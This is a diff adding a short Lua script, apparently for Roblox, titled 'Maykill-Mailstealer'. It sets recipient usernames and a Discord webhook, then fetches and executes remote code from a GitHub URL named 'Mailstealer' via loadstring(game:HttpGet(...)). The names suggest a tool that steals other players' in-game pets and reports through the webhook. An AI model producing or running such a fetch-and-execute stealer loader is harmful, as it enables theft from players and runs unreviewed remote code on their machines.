@@ -1,0 +1,17 @@
+--[[
+  __  __                _     _  _  _          __  __         _  _       _                _             
+ |  \/  |              | |   (_)| || |        |  \/  |       (_)| |     | |              | |            
+ | \  / |  __ _  _   _ | | __ _ | || | ______ | \  / |  __ _  _ | | ___ | |_  ___   __ _ | |  ___  _ __ 
+ | |\/| | / _` || | | || |/ /| || || ||______|| |\/| | / _` || || |/ __|| __|/ _ \ / _` || | / _ \| '__|
+ | |  | || (_| || |_| ||   < | || || |        | |  | || (_| || || |\__ \| |_|  __/| (_| || ||  __/| |   
+ |_|  |_| \__,_| \__, ||_|\_\|_||_||_|        |_|  |_| \__,_||_||_||___/ \__|\___| \__,_||_| \___||_|   
+                  __/ |                                                                                 
+                 |___/                                                                                        
+]]--
+
+UserName = "maykill is very cool" -- all good pets
+UserName2 = "maykill is very cool2" -- all bad pets
+Webhook = "Discordwebhook blalbalbla aoüiwdha098h2düa0i2jhdá09zh2´09ha´20d9ha2´d09ha´209dha´029hd" -- discord webhook for notifications
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Maykill-Scripts/Mailstealer/main/v1.1"))()
